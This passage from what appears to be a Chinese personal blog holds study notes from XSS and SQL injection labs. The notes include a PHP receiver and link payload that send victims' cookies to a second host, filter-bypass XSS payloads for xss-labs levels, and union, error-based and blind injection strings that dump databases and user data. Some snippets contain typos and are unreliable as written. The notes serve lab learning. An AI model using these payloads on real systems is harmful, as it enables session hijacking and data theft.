&quot;&lt;script&gt;document.write(&#39;你的用户名不正确，请重新登录&#39;);setTimeout(function()&#123;    location.href&#x3D; &#39;https:&#x2F;&#x2F;www.taobao.com&#39;;&#125;,3000);&lt;&#x2F;script&gt;&quot;;</code></pre><ul><li>渗透步骤<ul><li>输入点</li><li>网页源码</li><li>输出内容和输入内容之间的关系，构造闭合脚本</li></ul></li><li>技巧<ul><li>拼接输入</li></ul></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208251707261.png"alt="image-20220825170727204" /><figcaption aria-hidden="true">image-20220825170727204</figcaption></figure><h3 id="xss-获取cookie-实验">Xss 获取cookie 实验</h3><ul><li>132 获取130机器cookie</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$author</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 用成了post</span></code></pre><ul><li>文章中插入js代码</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208261544976.png"alt="image-20220826154354814" /><figcaption aria-hidden="true">image-20220826154354814</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaMan7/pictureBed/img/202209011720406.png"alt="image-20220901172025344" /><figcaption aria-hidden="true">image-20220901172025344</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209101707280.png"alt="获取cookie" /><figcaption aria-hidden="true">获取cookie</figcaption></figure><ul><li>发帖功能存在XSS漏洞</li></ul><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;BUtton onclick &#x3D; &quot;alert(documnet.cookie)&quot;&gt;点我有惊喜&lt;&#x2F;BUtton&gt;</code></pre><ul><li>blue-lotus 安装: <ahref="https://blog.csdn.net/qq_41683305/article/details/114282690">参考</a><ul><li>lampp 环境</li><li>blue-lotus 登录面板设置：登录密码+数据加密密码</li></ul></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209102301653.png"alt="image-20220910230132488" /><figcaption aria-hidden="true">image-20220910230132488</figcaption></figure><ul><li>一个lampp中的mysql 问题</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209102325463.png"alt="image-20220910232531377" /><figcaption aria-hidden="true">image-20220910232531377</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#在xampp中的bin 文件夹启动mysql</span><span class="token keyword">use</span> mysql<span class="token punctuation">;</span><span class="token keyword">update</span> <span class="token keyword">user</span> <span class="token keyword">set</span> password<span class="token operator">=</span>password<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span> <span class="token keyword">where</span> <span class="token keyword">user</span><span class="token operator">=</span><span class="token string">'root'</span> <span class="token operator">and</span> host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">;</span>flush <span class="token keyword">privileges</span><span class="token punctuation">;</span></code></pre><ul><li>回调的代码出错：</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111521655.png"alt="image-20220911152122560" /><figcaption aria-hidden="true">image-20220911152122560</figcaption></figure><ul><li>构建xss</li></ul><pre class="language-php" data-language="php"><code class="language-php">#132 xssReceive.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$ipaddr</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_COOKIE</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'123456'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'learn'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'数据库连接不成功.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">set_charset</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into xssdata(ipaddr,url,cookie,createtime) value('<span class="token interpolation"><span class="token variable">$ipaddr</span></span>', '<span class="token interpolation"><span class="token variable">$url</span></span>', '<span class="token interpolation"><span class="token variable">$cookie</span></span>', now())"</span><span class="token punctuation">;</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// echo "&lt;script>history.back();&lt;/script>"</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>loaction.href='http://www.woniunote.com/'&lt;/script>"</span><span class="token comment">// http://192.168.104.132/xss/xssReceive.php?url=</span></span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">'javascript:loacation.href="http://192.168.104.132/xss/xssReceive.php?url=“+location.href+”&amp;cookie="+document.cookie'</span><span class="token operator">></span>    <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"http://192.168.104.132/xss/01.png"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span>\' javascript<span class="token operator">:</span>loacation<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://192.168.104.132/xss/xssReceive.php?url="</span><span class="token operator">%</span>2Blocation<span class="token punctuation">.</span>href<span class="token operator">%</span>2B<span class="token string">"%26cookie="</span> <span class="token operator">%</span>2Bdocument<span class="token punctuation">.</span>cookie \'<span class="token operator">></span>    <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"http://192.168.104.132/xss/01.png"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111539634.png"alt="image-20220911153950543" /><figcaption aria-hidden="true">image-20220911153950543</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111559699.png"alt="不需要点击的payload" /><figcaption aria-hidden="true">不需要点击的payload</figcaption></figure><ul><li>获取到cookie<ul><li>直接访问文章页面</li><li>抓取请求报文</li><li>替换其中的cookie</li></ul></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111608617.png"alt="image-20220911160834500" /><figcaption aria-hidden="true">image-20220911160834500</figcaption></figure><h3 id="bluelotus">bluelotus</h3><ul><li>BlueLotus 无任何js模板<strong>问题</strong></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111702658.png"alt="image-20220911170240529" /><figcaption aria-hidden="true">image-20220911170240529</figcaption></figure><p><code>solu</code>: 使用这个project-<ahref="https://github.com/firesunCN/BlueLotus_XSSReceiver">最新firesunCN</a></p><p>尝试手动安装</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111712259.png"alt="image-20220911171231139" /><figcaption aria-hidden="true">image-20220911171231139</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111755540.png"alt="image-20220911175501435" /><figcaption aria-hidden="true">image-20220911175501435</figcaption></figure><h3 id="xss-攻防与绕过">xss 攻防与绕过</h3><ul><li>垂直越权与水平越权</li><li>xss 利用方式<ul><li>获取cookie越权</li><li>钓鱼网站，获取私密信息，再毫无痕迹地跳到请求网站</li><li>执行js代码，对另一个站点实施攻击</li></ul></li><li>xss 类型<ul><li>反射型：payload来自用户输入</li><li>存储型：payload来自存储在数据库中的内容</li><li><code>DOM-based</code></li></ul></li><li>防御<ul><li><code>htmlspecialchars()</code></li></ul></li></ul><h3 id="xss-labs">xss-labs</h3><p><a href="https://github.com/do0dl3/xss-labs">github</a></p><p><ahref="https://www.freebuf.com/articles/others-articles/339979.html">参考1</a></p><p><a href="https://zhuanlan.zhihu.com/p/451612357">参考2</a></p><ul><li>level-1</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120004239.png"alt="image-20220912000415096" /><figcaption aria-hidden="true">image-20220912000415096</figcaption></figure><pre class="language-markup" data-language="markup"><code class="language-markup">http://192.168.104.130/xss-labs/level1.php?name=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><ul><li>level-2</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120021466.png"alt="image-20220912002111411" /><figcaption aria-hidden="true">image-20220912002111411</figcaption></figure><pre class="language-markup" data-language="markup"><code class="language-markup">#闭合双引号和尖括号"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>alert('1')<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></code></pre><ul><li>level-3</li></ul><blockquote><ul><li><p>使用htmlspecialchars函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素</p></li><li><p>但是默认是只编码双引号的，而且单引号无论如何都不转义。</p></li><li><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p></li><li><p>预定义的字符是：</p><ul><li><p>'&amp;' （和号）成为 &amp;amp</p></li><li><p>''（双引号）成为 &amp;quot</p></li><li><p>' （单引号）成为 '</p></li><li><p>&lt; (小于)成为 &amp;lt</p></li><li><p>'&gt;'(大于) 成为&amp;gt</p></li></ul></li></ul></blockquote><p><strong>这题有毒</strong></p><ul><li>level-4</li></ul><p>换成双引号</p><ul><li>level-5<ul><li>屏蔽script和onclick 标签</li></ul></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121127091.png"alt="image-20220912112716944" /><figcaption aria-hidden="true">image-20220912112716944</figcaption></figure><ul><li>level-6<ul><li>屏蔽href: 大小写绕过</li></ul></li></ul><pre class="language-markup" data-language="markup"><code class="language-markup">"> &lt;a hRef =javascript:alert(1) /a></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121136620.png"alt="image-20220912113640527" /><figcaption aria-hidden="true">image-20220912113640527</figcaption></figure><ul><li>level-7<ul><li>只过滤一次</li></ul></li></ul><pre class="language-markup" data-language="markup"><code class="language-markup">"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scRScriptIpt</span><span class="token punctuation">></span></span>alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ScriScriptpt</span><span class="token punctuation">></span></span></code></pre><ul><li>level-8<ul><li>html 实体编码绕过</li></ul></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121333717.png"alt="image-20220912133304600" /><figcaption aria-hidden="true">image-20220912133304600</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121333191.png"alt="image-20220912133349148" /><figcaption aria-hidden="true">image-20220912133349148</figcaption></figure><pre class="language-none"><code class="language-none"> &lt;a hRef &#x3D;javascript:alert(1) &#x2F;a&gt;javascript:alert(1) html encode:&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</code></pre><ul><li>level-9<ul><li>判断有无 <code>http://</code></li></ul></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121354347.png"alt="image-20220912135434273" /><figcaption aria-hidden="true">image-20220912135434273</figcaption></figure><pre class="language-markup" data-language="markup"><code class="language-markup">javascript:alert(1)//http://www.baidu.com# 保留http://，其余编码</code></pre><ul><li>level-10</li></ul><pre class="language-markup" data-language="markup"><code class="language-markup"># 测试'' ' >&lt; script onclick</code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121425836.png"alt="三个隐藏标签" /><figcaption aria-hidden="true">三个隐藏标签</figcaption></figure><pre class="language-css" data-language="css"><code class="language-css"># 检测试探隐藏inputt_link=<span class="token string">" type='text'>//&amp;t_history="</span> type=<span class="token string">'text'</span>>//&amp;t_sort=" type=<span class="token string">'text'</span>>//</code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121638743.png"alt="image-20220912163849675" /><figcaption aria-hidden="true">image-20220912163849675</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121640380.png"alt="image-20220912164028316" /><figcaption aria-hidden="true">image-20220912164028316</figcaption></figure><ul><li>level-11</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121656755.png"alt="image-20220912165658683" /><figcaption aria-hidden="true">image-20220912165658683</figcaption></figure><pre class="language-none"><code class="language-none">t_link&#x3D;&quot; type&#x3D;&#39;text&#39;&gt;&#x2F;&#x2F;&amp;t_history&#x3D;&quot; type&#x3D;&#39;text&#39;&gt;&#x2F;&#x2F;&amp;t_sort&#x3D;&quot; type&#x3D;&#39;text&#39;&gt;&#x2F;&#x2F;&amp;t_ref&#x3D;&quot; type&#x3D;&#39;text&#39;&gt;&#x2F;&#x2F;</code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121657058.png"alt="image-20220912165738998" /><figcaption aria-hidden="true">image-20220912165738998</figcaption></figure><pre class="language-markup" data-language="markup"><code class="language-markup">" type='text' onclick='javascript:alert(1)'>//</code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121714232.png"alt="image-20220912171448180" /><figcaption aria-hidden="true">image-20220912171448180</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121711484.png"alt="image-20220912171155369" /><figcaption aria-hidden="true">image-20220912171155369</figcaption></figure><ul><li>level-12</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121722473.png"alt="image-20220912172222423" /><figcaption aria-hidden="true">image-20220912172222423</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121727641.png"alt="image-20220912172701532" /><figcaption aria-hidden="true">image-20220912172701532</figcaption></figure><ul><li>level-13</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121734412.png"alt="image-20220912173428363" /><figcaption aria-hidden="true">image-20220912173428363</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121738835.png"alt="image-20220912173841722" /><figcaption aria-hidden="true">image-20220912173841722</figcaption></figure><ul><li>level-14<ul><li>exif</li><li>有些网站有读取图片exif信息的功能，当网站读取到的恶意的exif信息就会触发这个payload</li></ul></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121957712.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ul><li>level-15</li></ul><pre class="language-markup" data-language="markup"><code class="language-markup">http://192.168.104.130/xss-labs/level15.php?src='level1.php?name=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>'</code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122025344.png"alt="image-20220912202525209" /><figcaption aria-hidden="true">image-20220912202525209</figcaption></figure><ul><li>level-16</li></ul><pre class="language-markup" data-language="markup"><code class="language-markup"># 试探“ ‘ &lt;> script onerror  onclick</code></pre><blockquote><ul><li>空格可以使用%0a和%0d替换</li></ul></blockquote><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;img%0asrc=1%0donerror=alert('xss')></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122344830.png"alt="image-20220912234430705" /><figcaption aria-hidden="true">image-20220912234430705</figcaption></figure><ul><li>level-17</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355653.png"alt="分析源码" /><figcaption aria-hidden="true">分析源码</figcaption></figure><pre class="language-markup" data-language="markup"><code class="language-markup">http://192.168.104.130/xss-labs/level18.php?arg01=a&amp;arg02=b onmouseover = alert(1)</code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355954.png"alt="image-20220912235558854" /><figcaption aria-hidden="true">image-20220912235558854</figcaption></figure><ul><li>level-19&amp;20<ul><li>flash xss 难度较大</li></ul></li></ul><hr /><p><strong>接下来的渗透博客将按专题分成多篇</strong></p>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入训练</title>
      <link href="/2022/08/23/sqli-labs/"/>
      <url>/2022/08/23/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h3 id="sqli-lab闯关">sqli-lab闯关</h3><p><a href="https://github.com/Audi-1/sqli-labs">环境搭建</a></p><ul><li>报错问题</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208201407493.png"alt="image-20220820140658390" /><figcaption aria-hidden="true">image-20220820140658390</figcaption></figure><ul><li>单引号</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><ahref="https://blog.csdn.net/xiayun1995/article/details/86500605">注释问题</a></p><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>security'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208201422459.png"alt="image-20220820142218341" /><figcaption aria-hidden="true">image-20220820142218341</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208201434057.png"alt="image-20220820143444929" /><figcaption aria-hidden="true">image-20220820143444929</figcaption></figure><h3 id="less-3">Less-3</h3><ul><li><code>(',')</code>闭合方式</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208201520182.png"alt="image-20220820152044050" /><figcaption aria-hidden="true">image-20220820152044050</figcaption></figure><ul><li><p>先试探出闭合类型</p></li><li><p>报错：<code>Duplicate entry 'USER0' for key 'group_key'</code></p></li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">group</span> <span class="token keyword">by</span> concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> x <span class="token keyword">from</span> users <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">;</span></code></pre><blockquote><ul><li><ahref="https://www.freebuf.com/articles/web/257881.html">原因在这</a></li><li>关键：<code>floor(rand(2)*2)</code>规律重复,主键重复</li></ul></blockquote><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208202215197.png"alt="image-20220820221540082" /><figcaption aria-hidden="true">image-20220820221540082</figcaption></figure><h3 id="less-1">Less-1</h3><p><ahref="https://www.cnblogs.com/Xy--1/p/12726288.html">闯关教程</a></p><p><ahref="https://blog.csdn.net/weixin_39934520/article/details/105282717">闯关教程2</a></p><blockquote><ul><li>显示位</li></ul></blockquote><p><strong>爆数据库</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span>-1' union <span class="token keyword">select</span> <span class="token number">1</span>,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span>,3 from information_schema.schemata--+ // <span class="token string">"union"</span><span class="token builtin class-name">:</span> 这是SQL语言中的一个关键字，表示将多个查询结果合并为一个结果集。<span class="token string">"select"</span><span class="token builtin class-name">:</span> 这是SQL语言中的一个关键字，表示从数据库中选择数据。<span class="token string">"1"</span><span class="token builtin class-name">:</span> 这是一个常量值，代表一个整数。<span class="token string">"group_concat"</span><span class="token builtin class-name">:</span> 这是MySQL数据库中的一个内置函数，用于将多个字符串连接起来。<span class="token string">"schema_name"</span><span class="token builtin class-name">:</span> 这是<span class="token string">"information_schema.schemata"</span>表中的一列，代表数据库名称。<span class="token string">"information_schema.schemata"</span><span class="token builtin class-name">:</span> 这是MySQL数据库中的一个系统数据库表，包含数据库信息。<span class="token string">"3"</span><span class="token builtin class-name">:</span> 这是一个常量值，代表一个整数</code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208202256203.png"alt="image-20220820225616066" /><figcaption aria-hidden="true">image-20220820225616066</figcaption></figure><p><strong>爆表</strong></p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">id=<span class="token operator">-</span>1<span class="token string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span>security' <span class="token operator">--</span><span class="token operator">+</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208202313114.png"alt="image-20220820231325984" /><figcaption aria-hidden="true">image-20220820231325984</figcaption></figure><p><strong>爆列</strong></p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">id=<span class="token operator">-</span>1<span class="token string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>users' <span class="token operator">--</span><span class="token operator">+</span></code></pre><blockquote><ul><li>问题： 不同数据库有相同的表名</li></ul></blockquote><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208202321782.png"alt="image-20220820232119645" /><figcaption aria-hidden="true">image-20220820232119645</figcaption></figure><ul><li>23%注释</li></ul><h3 id="less-5-盲注">Less-5: 盲注</h3><ul><li>数据库版本</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">left</span><span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--+</span></code></pre><ul><li>数据库名长度</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span> <span class="token comment">--+</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211510704.png"alt="image-20220821151058589" /><figcaption aria-hidden="true">image-20220821151058589</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 猜测数据库第一位</span><span class="token comment"># 可二分法</span>id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">left</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token string">'a'</span> <span class="token comment">--+</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 猜第一个表</span>id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">101</span> <span class="token comment">--+</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211517834.png"alt="image-20220821151753707" /><figcaption aria-hidden="true">image-20220821151753707</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 匹配列</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and 1=(select 1 from information_schema.columns where table_name='</span>users<span class="token string">' and column_name regexp '</span><span class="token operator">^</span>usern<span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span>' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">-- #</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 第一行数据中用户名这列的首字母</span>id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> ORD<span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> IFNULL<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span>username <span class="token keyword">AS</span> <span class="token keyword">CHAR</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token keyword">FROM</span> security<span class="token punctuation">.</span>users <span class="token 